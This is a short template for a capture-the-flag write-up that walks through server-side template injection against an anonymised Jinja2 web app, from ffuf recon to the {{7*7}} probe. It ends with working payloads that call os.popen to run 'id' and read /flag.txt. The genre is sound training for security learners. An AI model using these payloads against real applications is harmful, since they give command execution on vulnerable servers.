---
title: "CTF web walkthrough — SSTI to RCE"
date: 2026-08-06
category: ctf
description: "Template: recon → find the sink → template injection → shell. Duplicate this to start a new writeup."
tags: [ctf, web, ssti, rce, walkthrough]
---

> Template writeup — duplicate this file, rename it, and rewrite. Target anonymised as example.com.

## Recon

```bash
ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

A `/greeting?name=` parameter reflects input into the page.

## Finding the sink

Classic template-injection probe — does math evaluate server-side?

```
name={{7*7}}   ->  49
name=${7*7}    ->  ${7*7}
```

`{{7*7}}` → `49` means the input hits a Jinja2-style template engine.

## Exploitation

Walk the object chain to a command primitive:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

```
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

## Flag

```
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
-> flag{ssti_all_the_things}
```

## Takeaway

Any user input rendered *inside* a template (not just passed as a variable) is SSTI. Probe with the
engine-specific syntax, then climb the object graph to `os`/`subprocess`.
